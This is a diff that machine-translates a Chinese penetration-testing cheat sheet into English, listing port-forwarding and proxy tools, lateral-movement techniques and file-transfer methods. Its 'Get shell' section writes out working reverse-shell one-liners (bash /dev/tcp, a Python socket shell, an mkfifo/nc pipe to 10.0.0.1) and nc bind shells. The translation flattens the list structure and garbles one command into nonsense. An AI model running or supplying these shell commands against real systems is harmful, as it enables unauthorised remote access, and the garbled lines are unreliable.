@@ -1,62 +1,62 @@
-综合技巧
+Comprehensive skills
 ========================================
 
-端口转发
+Port Forwarding
 ----------------------------------------
 - windows
-    - lcx
-    - netsh
+- LCX
+- Netsh
 - linux
-    - portmap
-    - iptables
-- socket代理
-    - Win: xsocks
-    - Linux: proxychains
-- 基于http的转发与socket代理(低权限下的渗透)
-    - 端口转发: tunna
-    - socks代理: reGeorg
-- ssh通道
-    - 端口转发
-    - socks
+- portmap
+- iptables
+- socket proxy
+- Win: xsocks
+- Linux: proxychains
+- http-based forwarding and socket proxy (penetration under low privileges)
+- Port Forwarding: tunna
+- socks proxy: reGeorg
+- ssh channel
+- Port Forwarding
+- socks
 
-获取shell
+Get shell
 ----------------------------------------
-- 常规shell反弹
+- Regular shell rebound
 
 ::
 
-    bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 
-    python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
-    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
 
-- 突破防火墙的imcp_shell反弹
-- 正向shell
+- Imcp_shell rebound that breaks through the firewall
+- Forward shell
 
 ::
 
-    nc -e /bin/sh -lp 1234
-    nc.exe -e cmd.exe -lp 1234
+nc -e /bin/n-pn-pn-pp 1234
+nc.exe -e cmd.exe -lp 1234
 
-内网文件传输
+Intranet file transfer
 ----------------------------------------
-- windows下文件传输
-    - powershell
-    - vbs脚本文件
-    - bitsadmin
-    - 文件共享
-    - 使用telnet接收数据
-    - hta
-- linux下文件传输
-    - python
-    - wget
-    - tar + ssh
-    - 利用dns传输数据
-- 文件编译
-    - powershell将exe转为txt，再txt转为exe
+- File transfer under windows
+- powershell
+- vbs script file
+- bitsadmin
+- File Sharing
+- Receive data using telnet
+- hta
+- File transfer under linux
+- Python
+- wget
+- Tar + SSH
+- Transfer data using dns
+- File Compilation
+- powershell converts exe to txt, and then converts txt to exe
 
-远程连接 && 执行程序
+Remote connection && Execute the program
 ----------------------------------------
 - at&schtasks
 - psexec
@@ -64,7 +64,7 @@
 - wmiexec.vbs
 - smbexec
 - powershell remoting
-- SC创建服务执行
+- SC Creation Service Execution
 - schtasks
 - SMB+MOF || DLL Hijacks
 - PTH + compmgmt.msc
